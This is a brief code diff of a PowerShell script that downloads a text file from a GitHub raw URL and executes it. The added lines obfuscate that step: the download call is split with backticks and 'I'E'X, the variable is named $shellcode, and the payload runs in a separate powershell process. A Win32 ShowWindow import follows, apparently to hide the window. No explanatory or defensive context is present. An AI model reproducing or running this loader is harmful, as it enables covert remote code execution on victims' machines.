@@ -1,4 +1,7 @@
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt" -useb)
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+
 Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
